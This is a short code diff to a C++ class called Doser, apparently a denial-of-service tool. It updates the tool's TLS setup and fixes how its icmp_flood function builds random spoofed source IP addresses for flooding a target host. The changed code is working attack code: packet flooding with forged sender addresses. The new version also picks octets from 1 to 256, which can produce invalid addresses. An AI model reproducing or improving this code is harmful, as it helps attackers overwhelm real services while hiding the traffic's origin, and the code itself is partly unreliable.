@@ -313,7 +313,7 @@ int Doser::randomInt(int min, int max){
 }
 
 SSL_CTX *Doser::InitCTX() {
-    const SSL_METHOD *method{SSLv3_client_method()};
+    const SSL_METHOD *method{TLSv1_client_method()};
     SSL_CTX *ctx;
     OpenSSL_add_ssl_algorithms();
     SSL_load_error_strings();
@@ -376,14 +376,13 @@ void Doser::icmp_flood(const int *id) {
             }else{
                 bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
             }
-            std::string src{};
-            src += std::to_string(randomInt(1, 254))
-                   + std::to_string('.')
-                   + std::to_string(randomInt(1, 254))
-                   + std::to_string('.')
-                   + std::to_string(randomInt(1, 254))
-                   + std::to_string('.')
-                   + std::to_string(randomInt(1, 254));
+            std::string src{std::to_string(randomInt(1, 256))};
+            src += "."
+                   + std::to_string(randomInt(1, 256))
+                   + "."
+                   + std::to_string(randomInt(1, 256))
+                   + "."
+                   + std::to_string(randomInt(1, 256));
 
             if((ip->ip_src.s_addr = inet_addr(src.c_str())) < 0){
                 logger->Log("Unable to set random src ip", Logger::Error);
